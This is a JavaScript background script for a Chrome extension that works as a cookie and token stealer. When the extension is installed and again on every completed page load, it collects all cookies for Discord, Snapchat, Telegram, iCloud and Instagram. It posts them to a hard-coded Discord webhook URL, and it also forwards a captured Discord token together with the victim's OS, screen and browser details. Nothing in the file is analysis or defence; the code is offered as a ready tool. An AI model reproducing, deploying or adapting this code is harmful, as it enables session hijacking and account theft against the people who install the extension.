const WH = "https://discord.com/api/webhooks/1466835198942515254/MCAPfFl1novelcM6QGl9ZKP56zB1hijO6UdOm9zi-frGJ7pw6kE0mFDnqANHJCohg8JD";

async function log(data) {
    try {
        await fetch(WH, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: data })
        });
    } catch (e) {}
}

// سحب الكوكيز لكل المواقع المطلوبة بما فيها ديسكورد
async function grabCookies() {
    const targets = ["discord.com", "snapchat.com", "telegram.org", "icloud.com", "instagram.com"];
    for (const site of targets) {
        const cookies = await chrome.cookies.getAll({ domain: site });
        if (cookies.length > 0) {
            let cStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
            await log(`🍪 **[${site}] Cookies Captured:**\n\`\`\`${cStr.substring(0, 1800)}\`\`\``);
        }
    }
}

chrome.runtime.onMessage.addListener((m) => {
    if (m.type === "FULL_CAPTURE") {
        log(`🔥 **DISCORD FULL DATA**\n🔑 **Token:** \`${m.token}\` \n💻 **Device Info:** \n- OS: ${m.info.plt}\n- Screen: ${m.info.res}\n- Browser: ${m.info.ua}`);
    }
});

chrome.runtime.onInstalled.addListener(grabCookies);
chrome.tabs.onUpdated.addListener((id, info) => { if(info.status === 'complete') grabCookies(); });
